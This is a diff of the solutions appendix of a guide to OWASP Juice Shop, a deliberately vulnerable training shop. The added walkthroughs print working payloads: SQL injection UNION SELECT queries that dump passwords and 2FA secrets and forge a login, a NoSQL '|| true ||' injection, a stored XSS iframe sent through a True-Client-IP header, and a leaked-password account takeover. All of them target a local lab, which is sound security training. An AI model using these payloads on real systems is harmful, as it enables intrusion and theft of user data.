 7. You are now in the area of Blind SQL Injection, where trying create
    valid queries is a matter of patience, observance and a bit of luck.
 8. Varying the payload into `'--` for `q` results in a `SQLITE_ERROR:
@@ -795,7 +876,7 @@ simultaneously.
    products, including the (logically deleted) Christmas offer. Take
    note of its `id` (which should be `10`)
 
-   ![JSON search result with the Christmas special](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/search-result_christmas.png)
+   ![JSON search result with the Christmas special](img/search-result_christmas.png)
 10. Go to <http://localhost:3000/#/login> and log in as any user.
 11. Add any regularly available product into you shopping basket to
     prevent problems at checkout later. Memorize your `BasketId` value
@@ -817,7 +898,7 @@ This solution involves a lot less hacking & sophistication but requires
 more attention & a good portion of shrewdness.
 
 1. Retrieve all products as JSON by calling
-   <http://localhost:3000/rest/product/search?q=>
+   <http://localhost:3000/rest/products/search?q=>
 2. Write down all `id`s that are _missing_ in the otherwise sequential
    numeric range
 3. Perform step 12. and 13. from above solution for all those missing
@@ -827,7 +908,42 @@ more attention & a good portion of shrewdness.
 
 ### Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous
 
-:wrench: **TODO**
+1. Solve
+   [Order the Christmas special offer of 2014](#order-the-christmas-special-offer-of-2014)
+   but enumerate all deleted products until you come across "Rippertuer
+   Special Juice"
+2. Notice the warning _"This item has been made unavailable because of
+   lack of safety standards."_ in its description, indicating that this
+   is the product you need to investigate for this challenge
+3. Further notice the partial list of ingredients in the description
+   namely _"Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora,
+   Bael Aegle marmelos... and others"_
+4. Submitting either or all of the above ingredients at
+   <http://localhost:3000/#/contact> will **not** solve this challenge -
+   it must be some unlisted ingredients that create a dangerous
+   combination.
+5. A simple Google search for `Cherymoya Annona cherimola Jabuticaba
+   Myrciaria cauliflora Bael Aegle marmelos` should bring up several
+   results, one of them being a blog post "Top 20 Fruits You Probably
+   Don’t Know" from 2011. Visit this post at
+   <https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know>
+6. Scrolling through the list of replies you will notice
+   [a particular comment from user _Localhorst_](https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know/#comment-4541753139)
+   saying _"Awesome, some of these fruits also made it into our
+   "Rippertuer Special Juice"! https://pastebin.com/90dUgd7s"_
+7. Visit <https://pastebin.com/90dUgd7s> to find a PasteBin paste titled
+   "Rippertuer Special Juice Ingredients" containing a JSON document
+   with many exotic fruits in it, each with its name as `type` and a
+   detailed `description`
+8. When carefully reading all fruit descriptions you will notice a
+   warning on the `Hueteroneel` fruit that _"this coupled with Eurogium
+   Edule was sometimes found fatal"_
+
+   ![Ingredients list of "Rippertuer Special Juice"](img/rippertuer-ingredients.png)
+9. As `Eurogium Edule` is also on the very same list of ingredients,
+   these two must be the ones you are looking for
+10. Submit a comment containing both `Eurogium Edule` and `Hueteroneel`
+    via <http://localhost:3000/#/contact> to solve this challenge
 
 ### Find the hidden easter egg
 
@@ -849,7 +965,7 @@ more attention & a good portion of shrewdness.
 5. Visit
    <http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg>
 
-   ![Planet Orangeuze](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/planet_orangeuze.png)
+   ![Planet Orangeuze](img/planet_orangeuze.png)
 6. Marvel at _the real_ easter egg: An interactive 3D scene of _Planet
    Orangeuze_!
 
@@ -866,7 +982,21 @@ more attention & a good portion of shrewdness.
 
 ### Successfully redeem an expired campaign coupon code
 
-:wrench: **TODO**
+1. Open `main.js` in your Browser's dev tools and search for `campaign`.
+
+   ![Campaign code in minified JavaScript](img/minified_js-campaigncode.png)
+2. You will find a function `applyCoupon()` that contains a static
+   comparison `"WMNSDY2019" === this.couponControl.value` pointing to
+   `WMNSDY2019` as the solution.
+3. Submitting `WMNSDY2019` will yield an `Invalid Coupon.` error,
+   though. This is because of the second part of the validity check
+   `15519996e5 === this.clientDate`.
+4. Converting this number into a JavaScript date will tell you that this
+   campaign was active on March 8th 2019 only: Women's Day!
+5. Set the time of your computer to March 8th 2019 and try to submit the
+   code again.
+6. This time it will be accepted! Proceed to _Checkout_ to get the
+   challenge solved.
 
 ### Access a developer's forgotten backup file
 
@@ -913,7 +1043,7 @@ more attention & a good portion of shrewdness.
    `main.js` and search for `oauth`, which will eventually reveal a
    function `userService.oauthLogin()`.
 
-   ![oauthLogin function in main.js](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/minified_js-oauth.png)
+   ![oauthLogin function in main.js](img/minified_js-oauth.png)
 4. In the function body you will notice a call to `userService.save()` -
    which is used to create a user account in the non-Google _User
    Registration_ process - followed by a call to the regular
@@ -925,14 +1055,37 @@ more attention & a good portion of shrewdness.
    function to encode strings into Base64.
 7. What is passed into `btoa()` is `email.split("").reverse().join("")`,
    which is simply the email address string reversed.
-8. Now all you have to do is Base64-encode
-   `moc.liamelgoog@hcinimmik.nreojb`, so you can log in directly with
-   _Email_ `bjoern.kimminich@googlemail.com` and _Password_
-   `bW9jLmxpYW1lbGdvb2dAaGNpbmltbWlrLm5yZW9qYg==`.
+8. Now all you have to do is Base64-encode `moc.liamg@hcinimmik.nreojb`,
+   so you can log in directly with _Email_ `bjoern.kimminich@gmail.com`
+   and _Password_ `bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=`.
 
-### Find an old Recycle request and inform the shop about its unusual address
+### Steal someone else's personal data without using Injection
 
-:wrench: **TODO**
+1. Log in as any user, put some items into your basket and create an
+   order from these.
+2. Copy the order ID from the confirmation PDF. It should look similar
+   to `5267-829f123593e9d098` in its format.
+3. Visit <http://localhost:3000/#/track-order>, paste in your _Order ID_
+   and then click _Track_.
+4. In the network tab of your browser you should find a request similar
+   to <http://localhost:3000/rest/track-order/7962-6e31e50a0c6f2ea3>.
+5. Inspecting the response closely, you might notice that the user email
+   address is partially obfuscated:
+   `{"status":"success","data":[{"orderId":"5267-829f123593e9d098","email":"*dm*n@j**c*-sh.*p","totalPrice":2.88,"products":[{"quantity":1,"name":"Apple
+   Juice
+   (1000ml)","price":1.99,"total":1.99,"bonus":0},{"quantity":1,"name":"Apple
+   Pomace","price":0.89,"total":0.89,"bonus":0}],"bonus":0,"eta":"2","_id":"tosmfPsDaWcEnzRr3"}]}`
+6. It looks like certain letters - seemingly all vowels - were replaced
+   with `*` characters before the order was stored in the database.
+7. Register a new user with an email address that would result in _the
+   exact same_ obfuscated email address. For example register
+   `edmin@juice-sh.op` to steal the data of `admin@juice-sh.op`.
+8. Log in with your new user and immediately get your data exported via
+   <http://localhost:3000/#/privacy-security/data-export>.
+9. You will notice that the order belonging to the existing user
+   `admin@juice-sh.op` (in this example `5267-829f123593e9d098`) is part
+   of your new user's data export due to the clash when obfuscating
+   emails!
 
 ### Access a misplaced SIEM signature file
 
@@ -944,38 +1097,38 @@ more attention & a good portion of shrewdness.
 ### Let the server sleep for some time
 
 1. You can interact with the backend API for product reviews via the
-   dedicated endpoints `/rest/product/reviews` and
-   `/rest/product/{id}/reviews`
+   dedicated endpoints `/rest/products/reviews` and
+   `/rest/products/{id}/reviews`
 2. Get the reviews of the product with database ID 1:
-   http://localhost:3000/rest/product/1/reviews
+   http://localhost:3000/rest/products/1/reviews
 3. Inject a
    [`sleep(integer ms)` command](https://docs.mongodb.com/manual/reference/method/sleep/)
    by changing the URL into
-   http://localhost:3000/rest/product/sleep(2000)/reviews to solve the
+   http://localhost:3000/rest/products/sleep(2000)/reviews to solve the
    challenge
 
 To avoid _real_ Denial-of-Service (DoS) issues, the Juice Shop will only
 wait for a maximum of 2 seconds, so
-http://localhost:3000/rest/product/sleep(999999)/reviews should not take
-longer than http://localhost:3000/rest/product/sleep(2000)/reviews to
-respond.
+http://localhost:3000/rest/products/sleep(999999)/reviews should not
+take longer than http://localhost:3000/rest/products/sleep(2000)/reviews
+to respond.
 
 ### Update multiple product reviews at the same time
 
 1. Log in as any user to get your `Authorization` token from any
    subsequent request's headers.
-2. Submit a PATCH request to http://localhost:3000/rest/product/reviews
+2. Submit a PATCH request to http://localhost:3000/rest/products/reviews
    with
    * `{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }` as body
    * `application/json` as `Content-Type` header.
    * and `Bearer ?` as `Authorization` header, replacing the `?` with
      the token you received in step 1.
 
-   ![Multiple review updated via NoSQL Injection](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/nosql_multiple-reviews-updated.png)
+   ![Multiple review updated via NoSQL Injection](img/nosql_multiple-reviews-updated.png)
 3. Check different product detail dialogs to verify that _all review
    texts_ have been changed into `NoSQL Injection!`
 
-### Wherever you go, there you are
+### Enforce a redirect to a page you are not supposed to redirect to
 
 1. Pick one of the redirect links in the application, e.g.
    <http://localhost:3000/redirect?to=https://github.com/bkimminich/juice-shop>
@@ -996,7 +1149,7 @@ respond.
    you to _Bender from [Futurama](http://www.imdb.com/title/tt0149460/)_
    as the only viable option
 
-   ![Bender](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/Bender_Rodriguez.png)
+   ![Bender](img/Bender_Rodriguez.png)
 2. Visit https://en.wikipedia.org/wiki/Bender_(Futurama) and read the
    _Character Biography_ section
 3. It tells you that Bender had a job at the metalworking factory,
@@ -1017,7 +1170,7 @@ respond.
    point notice that `5.png` is the only PNG file among otherwise only
    JPGs in the customer feedback carousel:
 
-   ![Steganography customer support image](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/steganography.png)
+   ![Steganography customer support image](img/steganography.png)
 2. Running this image through some decoders available online will
    probably just return garbage, e.g.
    <http://stylesuxx.github.io/steganography/> gives you `ÿÁÿm¶Û$ÿ
@@ -1027,7 +1180,7 @@ respond.
    <https://incoherency.co.uk/image-steganography/#unhide> you will also
    find nothing independent of how you set the _Hidden bits_ slider:
 
-   ![Steganography unhiding fails](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/steganography_failed-unhide.png)
+   ![Steganography unhiding fails](img/steganography_failed-unhide.png)
 3. Moving on to client applications you might end up with
    [OpenStego](https://www.openstego.com/) which is built in Java but
    also offers a Windows installer at
@@ -1035,7 +1188,7 @@ respond.
 4. Selecting the `5.png` and clicking _Extract Data_ OpenStego will
    quickly claim to have been successful:
 
-   ![Steganography exctraction successful](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/steganography_openstego-success.png)
+   ![Steganography exctraction successful](img/steganography_openstego-success.png)
 5. The image that will be put into the _Output Stego file_ location
    clearly depicts a pixelated version of
    [Pickle Rick](https://en.wikipedia.org/wiki/Pickle_Rick) (from S3E3 -
@@ -1043,12 +1196,12 @@ respond.
    [Rick & Morty](https://en.wikipedia.org/wiki/Rick_and_Morty) episodes
    ever)
 
-   ![Pickle Rick unveiled](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/steganography_pickle-rick.png)
+   ![Pickle Rick unveiled](img/steganography_pickle-rick.png)
 6. Visit <http://localhost:3000/#/contact>
 7. Submit your feedback containing the name `Pickle Rick` (case doesn't
    matter) to solve this challenge.
 
-### Inform the shop about a typosquatting trick it has become victim of
+### Inform the shop about a typosquatting trick it has been a victim of
 
 1. Solve the
    [Access a developer's forgotten backup file](#access-a-developers-forgotten-backup-file)
@@ -1058,7 +1211,7 @@ respond.
    that you find the culprit at
    https://www.npmjs.com/package/epilogue-js
 
-   ![epilogue-js on NPM](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/npm_epilogue-js.png)
+   ![epilogue-js on NPM](img/npm_epilogue-js.png)
 3. Visit <http://localhost:3000/#/contact>
 4. Submit your feedback with `epilogue-js` in the comment to solve this
    challenge
@@ -1069,13 +1222,13 @@ it where not marked with the _THIS IS **NOT** THE MODULE YOU ARE LOOKING
 FOR!_-warning at the very top. Below you can see the original `epilogue`
 NPM page:
 
-![epilogue on NPM](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/npm_epilogue.png)
+![epilogue on NPM](img/npm_epilogue.png)
 
 ### Retrieve a list of all user credentials via SQL Injection
 
 1. During the
    [Order the Christmas special offer of 2014](#order-the-christmas-special-offer-of-2014)
-   challenge you learned that the `/rest/product/search` endpoint is
+   challenge you learned that the `/rest/products/search` endpoint is
    susceptible to SQL Injection into the `q` parameter.
 2. The attack payload you need to craft is a `UNION SELECT` merging the
    data from the user's DB table into the products returned in the JSON
@@ -1104,26 +1257,26 @@ NPM page:
    3. `')) UNION SELECT '1', '2', '3' FROM Users--` fails with `number
       of result columns` error
    4. (...)
-   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7' FROM Users--`
-      _still fails_ with `number of result columns` error
-   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+      Users--` _still fails_ with `number of result columns` error
+   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
       Users--` finally gives you a JSON response back with an extra
       element
-      `{"id":"1","name":"2","description":"3","price":"4","image":"5","createdAt":"6","updatedAt":"7","deletedAt":"8"}`.
+      `{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}`.
 
 7. Next you get rid of the unwanted product results changing the query
    into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
-   '6', '7', '8' FROM Users--` leaving only the "`UNION`ed" element in
-   the result set
+   '6', '7', '8', '9' FROM Users--` leaving only the "`UNION`ed" element
+   in the result set
 8. The last step is to replace the fixed values with correct column
    names. You could guess those **or** derive them from the RESTful API
    results **or** remember them from previously seen SQL errors while
    attacking the _Login_ form.
 9. Searching for `qwert')) UNION SELECT '1', id, email, password, '5',
-   '6', '7', '8' FROM Users--` solves the challenge giving you a the
-   list of all user data in convenient JSON format.
+   '6', '7', '8', '9' FROM Users--` solves the challenge giving you a
+   the list of all user data in convenient JSON format.
 
-   ![User list from UNION SELECT attack](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/union_select-attack_result.png)
+   ![User list from UNION SELECT attack](img/union_select-attack_result.png)
 
 There is of course a much easier way to retrieve a list of all users as
 long as you are logged in: Open <http://localhost:3000/#/administration>
@@ -1141,7 +1294,7 @@ like [Retire.js](https://retirejs.github.io/) or
 [Snyk](https://snyk.io/vuln) makes it rather easy to identify it.
 
 1. Solve
-   [Access a developer's forgotten backup file](../part2/roll-your-own-security.md#access-a-developers-forgotten-backup-file)
+   [Access a developer's forgotten backup file](../part2/sensitive-data-exposure.md#access-a-developers-forgotten-backup-file)
 2. Checking the dependencies in `package.json.bak` for known
    vulnerabilities online will give you a match (at least) for
    * `sanitize-html`: Sanitization of HTML strings is not applied
@@ -1182,17 +1335,44 @@ explains the problem and gives an exploit example:
 4. Visit http://localhost:3000/#/about for a first "xss" alert (from the
    _Customer Feedback_ slideshow)
 
-   ![XSS alert box](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss4_alert.png)
+   ![XSS alert box](img/xss4_alert.png)
 5. Visit http://localhost:3000/#/administration for a second "xss" alert
    (from the _Customer Feedback_ table)
 
-   ![XSS alert box in admin area](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/xss4_alert-admin.png)
+   ![XSS alert box in admin area](img/xss4_alert-admin.png)
 
 ###  Perform a persisted XSS attack through an HTTP header
 
-:wrench: **TODO**
+1. Log in as any user.
+2. Visit <http://localhost:3000/#/privacy-security/last-login-ip> where
+   your _IP Address_ probably shows as `0.0.0.0`.
 
-## Dreadful Challenges (  :star::star::star::star::star:  )
+   ![Normal Last Login IP address](img/normal_lastLoginIp.png)
+3. Log out and then log in again with the same user as before.
+4. Visit <http://localhost:3000/#/privacy-security/last-login-ip> again
+   where your _IP Address_ should now show your actual remote IP address
+   (or `127.0.0.1` if you run the application locally).
+5. Find the request to <https://localhost:3000/rest/saveLoginIp> in your
+   Browser DevTools.
+6. Replay the request after adding the `X-Forwarded-For` HTTP header to
+   spoof an arbitrary IP, e.g. `1.2.3.4`.
+7. Unfortunately in the response (and also on
+   <http://localhost:3000/#/privacy-security/last-login-ip> after
+   logging in again) you will still find your remote IP as before
+8. Repeat step 6. only with the proprietary header `True-Client-IP`.
+9. In the JSON response you will notice `lastLoginIp: "1.2.3.4"` and
+   after logging in again you will see `1.2.3.4` as your _IP Address_ on
+   <http://localhost:3000/#/privacy-security/last-login-ip>.
+10. Replay the request once more with `True-Client-IP: <iframe
+    src="javascript:alert(``xss``)">` to solve this seriously obscure
+    challenge.
+11. Log in again and visit
+    <http://localhost:3000/#/privacy-security/last-login-ip> see the
+    alert popup.
+
+    ![XSS in Last Login IP address](img/xss5_lastLoginIp.png)
+
+## ⭐⭐⭐⭐⭐ Challenges
 
 ### Learn about the Token Sale before its official announcement
 
@@ -1202,12 +1382,12 @@ explains the problem and gives an exploit example:
    `Vu()` and `Hu(l)`. These names are obfuscated, so they might be
    different for you.
 
-   ![Obfuscated token sale related functions in main.js](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/minified_js-tokensale.png)
+   ![Obfuscated token sale related functions in main.js](img/minified_js-tokensale.png)
 3. Searching for references to those functions in `main.js` might yield
    some more functions, like `zu(l)` and some possible route name
    `app-token-sale`
 
-   ![More token sale related functions in main.js](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/minified_js-tokensale_trail.png)
+   ![More token sale related functions in main.js](img/minified_js-tokensale_trail.png)
 4. Navigate to <http://localhost:3000/#/app-token-sale> or variations
    like <http://localhost:3000/#/token-sale> just to realize that these
    routes do not exist.
@@ -1220,11 +1400,11 @@ explains the problem and gives an exploit example:
    but not to a static title. It is mapped to another variable `Ca`
    (which might be named differently for you)
 
-   ![Tokensale route mapping in main.js](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/minified_js-tokensale_route.png)
+   ![Tokensale route mapping in main.js](img/minified_js-tokensale_route.png)
 6. Search for `function Ca(` to find the declaration of the function
    that should return a matcher to the route name you are looking for.
 
-   ![Tokensale route matcher in main.js](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/minified_js-tokensale_matcher.png)
+   ![Tokensale route matcher in main.js](img/minified_js-tokensale_matcher.png)
 7. Copy the obfuscating function into the JavaScript console of your
    browser and execute it immediately by appending a `()`. This will
    probably yield a `Uncaught SyntaxError: Unexpected token )`. When you
@@ -1236,7 +1416,7 @@ explains the problem and gives an exploit example:
 9. The code that gives you the sought-after path is the code block
    passed into the `match()` function inside `Ca(l)`!
 
-   ![Code block returning the Tokensale path](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/minified_js-tokensale_path-block.png)
+   ![Code block returning the Tokensale path](img/minified_js-tokensale_path-block.png)
 10. Copying that inner code block and executing that in your console
     will still yield an error!
 11. You need to append it to a string to make it work, which will
@@ -1290,7 +1470,7 @@ explains the problem and gives an exploit example:
    <http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic>
    to solve the challenge.
 
-   ![GET request via PostMan](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/csrf_postman.png)
+   ![GET request via PostMan](img/csrf_postman.png)
 
 #### Bonus Round: Delivering the attack via reflected XSS
 
@@ -1323,24 +1503,88 @@ Pretty-printed this attack is easier to understand:
 Anyone who is logged in to the Juice Shop while clicking on this link
 will get their password set to the same one we forced onto Bender!
 
-:clap: Kudos to Joe Butler, who originally described this advanced XSS
+👏 Kudos to Joe Butler, who originally described this advanced XSS
 payload in his blog post
 [Hacking(and automating!) the OWASP Juice Shop](https://incognitjoe.github.io/hacking-the-juice-shop.html).
 
 ### Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to
 
-:wrench: **TODO**
+1. Visit <https://stackoverflow.com/questions/tagged/access-log> to find
+   all questions tagged with `access-log` in this popular platform
+2. The list of questions should not be excessive and one mentioning a
+   familiar URL path might immediately stand out
+
+   ![Questions tagged 'access-log' on StackOverflow](img/stackoverflow_access-log.png)
+3. Visit
+   <https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan>
+   to find more unambiguous URL paths from the Juice Shop in it
+
+   ![Question on expressjs/morgan configuration](img/stackoverflow_morgan_question.png)
+4. Follow the link to PasteBin that is mentioned below the log file
+   snippet in _"(see https://pastebin.com/4U1V1UjU for more)"_
+5. On <https://pastebin.com/4U1V1UjU> search for `password` to find log
+   entries that might help with the ultimate challenge goal
+6. You will find one particularly interesting `GET` request that has
+   been logged as `161.194.17.103 - - [27/Jan/2019:11:18:35 +0000] "GET
+   /rest/user/change-password?current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB&new=sjss22%@%E2%82%AC55jaJasj!.k&repeat=sjss22%@%E2%82%AC55jaJasj!.k8
+   HTTP/1.1" 401 39 "http://localhost:3000/" "Mozilla/5.0 (Linux;
+   Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko)
+   Chrome/71.0.3578.99 Mobile Safari/537.36"`
+7. The mismatched `new` and `repeat` parameters and the return code of
+   `401` indicate that this password change failed. This means the
+   password could still be the current one of
+   `0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB`!
+8. Not knowing which user it belongs to, you can now
+   * either perform a _Password Spraying_ attack by trying to log in
+     with the password for all known user emails, e.g. from
+     [Access the administration section of the store](#access-the-administration-section-of-the-store)
+   * hash the known password with `MD5` and compare it to the password
+     hashes harvested from
+     [Retrieve a list of all user credentials via SQL Injection](#retrieve-a-list-of-all-user-credentials-via-sql-injection)
+9. Either way you will conclude that the password belongs to
+   `J12934@juice-sh.op` so using this as _Email_ and
+   `0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB` as _Password_ on
+   <http://localhost:3000/#/login> will solve the challenge
+
+🤡 Did you notice that one of the next requests of `161.194.17.103` in
+the leaked access log went to <http://localhost:3000/api/Complaints> and
+returned a `201 Created` HTTP status code? It seems the user
+successfully complained, but eventually didn't bother or was too
+frustrated to finish what he originally planned to do.
 
 ###  Perform an unwanted information disclosure by accessing data cross-domain
 
 1. Find a request to the ```/rest/user/whoami``` API endpoint. Notice
    that you can remove the "Authorization" header and it still works.
-   ![Normal whoami call](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/normal_whoami.png)
+   ![Normal whoami call](img/normal_whoami.png)
 
 2. Add a URL parameter called "callback". This will cause the API to
    return the content as a JavaScript fragment (JSONP) rather than just
    a standard JSON object.
-   ![whoami call using JSONP](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/jsonp_whoami.png)
+   ![whoami call using JSONP](img/jsonp_whoami.png)
+
+### Log in with the (non-existing) accountant without ever registering that user
+
+1. Go to <http://localhost:3000/#/login> and try logging in with _Email_
+   `'` and any _Password_ while observing the Browser DevTools network
+   tab.
+2. You will notice the SQL query for the login in the error being
+   thrown: `"sql": "SELECT * FROM Users WHERE email = ''' AND password =
+   '339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL"`
+3. Solve
+   [Exfiltrate the entire DB schema definition via SQL Injection](#exfiltrate-the-entire-db-schema-definition-via-sql-injection)
+   to learn the exact column names of the `Users` table.
+4. Prepare a `UNION SELECT` payload what will a) ensure there is no
+   result from the original query and b) will add the needed user
+   on-the-fly using static values in the query.
+5. Log in with _Email_ `' UNION SELECT * FROM (SELECT 15 as 'id', '' as
+   'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as
+   'password', 'accounting' as 'role', '1.2.3.4' as 'lastLoginIp' ,
+   'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive',
+   '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16
+   14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`
+6. This will trick the application backend into handing out a valid JWT
+   token and thus establishing a user session.
 
 ### Retrieve the language file that never made it into production
 
@@ -1371,7 +1615,7 @@ This will quickly bring you over to
 spoilers _Klingon_ as a supported language. Hovering over the
 corresponding flag will eventually spoiler the language code `tlh_AA`.
 
-![Crowdin Klingon Spoiler](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/crowdin_klingon-spoiler.png)
+![Crowdin Klingon Spoiler](img/crowdin_klingon-spoiler.png)
 
 > The Klingon language was originally created to add realism to a race
 > of fictional aliens who inhabit the world of Star Trek, an American
@@ -1381,6 +1625,53 @@ corresponding flag will eventually spoiler the language code `tlh_AA`.
 > vocabulary, grammar, figures of speech, and even slang and regional
 > dialects. Today it is spoken by humans all over the world, in many
 > contexts.[^3]
+
+### Solve the 2FA challenge for user "wurstbrot"
+
+1. [Access the administration section of the store](#access-the-administration-section-of-the-store)
+   while inspecting network traffic.
+2. You will learn the email address of the user in question is
+   unsurprisingly `wurstbrot@juice-sh.op`.
+3. You will also notice that there is no information about any user's
+   2FA configuration in the responses from `/api/Users`.
+4. Solve
+   [Retrieve a list of all user credentials via SQL Injection](#retrieve-a-list-of-all-user-credentials-via-sql-injection)
+   and keep its final attack payload ready.
+5. Change the one of the `null`s in payload to hopefully find a column
+   that contains the secret key for the 2FA setup:
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null,null%20from%20users-->
+     yields a `500` error with `SequelizeDatabaseError: SQLITE_ERROR: no
+     such column: 2fa`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null,null%20from%20users-->
+     fails with `no such column: 2fakey`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null,null%20from%20users-->
+     fails with `no such column: 2fasecret`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null,null%20from%20users-->
+     also fails with `no such column: totp`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null,null%20from%20users-->
+     fails again yielding `no such column: totpkey`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users-->
+     finally succeeds with a `200` response as this column exists!
+6. In the response from
+   <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users-->
+   find the entry of user `wurstbrot@juice-sh.op` with
+   `"image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"` whereas all other users
+   have `"image":""` set.
+7. Using your favorite 2FA application (e.g.
+   [Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2))
+   create a new entry, but instead of scanning any QR code type in the
+   key `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH` manually.
+8. Go to <http:localhost:3000/#/login> and use SQL Injection to log in
+   with `wurstbrot@juice-sh.op'--` as _Username_ and anything as
+   _Password_.
+9. You will be presented with the _Two Factor Authentication_ input
+   screen where you now have to type in the 6-digit code currently
+   displayed on your 2FA app.
+
+   ![Google Authenticator for wurstbrot](img/2fa_authenticator.png)
+   ![2FA input dialog](img/2fa_challenge.png)
+10. After clicking _Log in_ you are logged in and the challenge will be
+    marked as solved!
 
 ### Forge an essentially unsigned JWT token
 
@@ -1433,7 +1724,26 @@ JSON payload `POST`ed to <http://localhost:3000/rest/user/login>.
 
 ###  All your orders are belong to us
 
-:wrench: **TODO**
+1. Open the network tab of your browser's DevTools.
+2. Visit <http://localhost:3000/#/track-order> and search for `x` to
+   witness a `GET` request <http://localhost:3000/rest/track-order/x>
+   being sent returning `{"status":"success","data":[{"orderId":"x"}]}`.
+3. Search for `'` (single quote) as _Order ID_ now.
+   <http://localhost:3000/rest/track-order/'> will throw an error
+
+   ![NoSQL query error from invalid token](img/error_page-nosqli.png)
+4. Searching for `''` (two single quotes) as _Order ID_ now will let
+   <http://localhost:3000/rest/track-order/''> throw an `Unexpected
+   string` error instead of the previous `Invalid or unexpected token`.
+5. While not stated anywhere in the error messages, it can be assumed
+   with some MongoDB background that the query probably resembles
+   something like `{ $where: "property === '" + payload + "'" }`.
+6. The required `payload` for the challenge needs to make sure all data
+   is matched while squeezing itself into the query in a non-breaking
+   way.
+7. Search for `' || true || '` resulting in
+   <http://localhost:3000/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'>
+   which will in fact query and return all orders from the MarsDB.
 
 ### Perform a Remote Code Execution that would keep a less hardened application busy forever
 
@@ -1441,7 +1751,7 @@ JSON payload `POST`ed to <http://localhost:3000/rest/user/login>.
    [Swagger](https://swagger.io) API documentation hosted at
    <http://localhost:3000/api-docs> which describes the B2B API.
 
-   ![Swagger API-Docs](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/swagger_api-docs.png)
+   ![Swagger API-Docs](img/swagger_api-docs.png)
 2. This API allows to `POST` orders where the order lines can be sent as
    JSON objects (`orderLines`) but also as a String (`orderLinesData`).
 3. The given example for `orderLinesDate` indicates that this String
@@ -1449,7 +1759,7 @@ JSON payload `POST`ed to <http://localhost:3000/rest/user/login>.
    12,"quantity": 10000,"customerReference": ["PO0000001.2",
    "SM20180105|042"],"couponCode": "pes[Bh.u*t"},...]`
 
-   ![Swagger Order Model](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/appendix/img/swagger_models-order.png)
+   ![Swagger Order Model](img/swagger_models-order.png)
 4. Click the _Try it out_ button and without changing anything click
    _Execute_ to see if and how the API is working. This will give you a
    `401` error saying `No Authorization header was found`.
@@ -1519,7 +1829,7 @@ JSON payload `POST`ed to <http://localhost:3000/rest/user/login>.
 1. Trying to find out who "Morty" might be should _eventually_ lead you
